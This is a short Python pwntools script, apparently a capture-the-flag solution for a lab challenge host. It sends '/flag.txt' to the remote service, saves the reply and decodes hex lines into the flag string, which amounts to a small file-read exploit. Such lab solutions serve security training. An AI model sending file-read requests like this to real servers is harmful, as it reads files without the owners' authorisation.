from pwn import *


docker_url = "d18cb6a1-f874-40c4-9b55-e43e60835713.rdocker.vuln.land"

rem = remote(docker_url, 80)

with open('test.txt', 'wb') as fi:
    rem.sendline("/flag.txt")
    fi.write(rem.recvall())

flag = ""
with open('test.txt', 'r', encoding='utf-8', errors='replace') as fi:
    lines = fi.readlines()

    for line in lines:
        try:
            num = int(line[1:], 16)
            flag += chr(num)
        except:
            pass

print(flag)